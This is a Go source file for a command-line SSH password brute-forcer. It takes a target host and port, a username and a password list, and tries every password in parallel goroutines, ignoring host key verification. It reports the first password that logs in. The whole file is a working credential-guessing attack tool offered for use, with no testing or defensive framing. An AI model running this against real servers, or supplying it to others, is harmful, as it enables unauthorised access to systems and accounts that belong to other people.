package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"os"
	"sync"

	"golang.org/x/crypto/ssh"
)

// Options struct for script options
type Options struct {
	url      string
	user     string
	passList string
}

// OPTIONS global variable with options
var OPTIONS = Options{}

func parseOptions() {
	if len(os.Args) != 7 {
		fmt.Printf("Usage %s -url <URL:POR> -user <USERNAME> -pass <PASSWORD-LIST>\nPassword list should be separated with newline", os.Args[0])
		os.Exit(1)
	}
	flag.StringVar(&OPTIONS.url, "url", "", "URL string with the port separated with a colon")
	flag.StringVar(&OPTIONS.user, "user", "", "Login username")
	flag.StringVar(&OPTIONS.passList, "pass", "", "Filename path to pass list")
	flag.Parse()
}

func auth(password string, wg *sync.WaitGroup) {
	defer wg.Done()
	config := &ssh.ClientConfig{
		User: OPTIONS.user,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	_, err := ssh.Dial("tcp", OPTIONS.url, config)
	if err != nil {
		log.Println(err)
	} else {
		log.Printf("Found! user=%s, pass=%s\n", OPTIONS.user, password)
		os.Exit(0)
	}
}

func main() {
	parseOptions()
	file, err := os.Open(OPTIONS.passList)
	if err != nil {
		log.Fatalln(err)
	}
	defer file.Close()

	reader := bufio.NewScanner(file)
	var password string
	wg := new(sync.WaitGroup)
	for reader.Scan() {
		wg.Add(1)
		password = reader.Text()
		go auth(password, wg)
	}
	wg.Wait()
	log.Println("Done!")
}
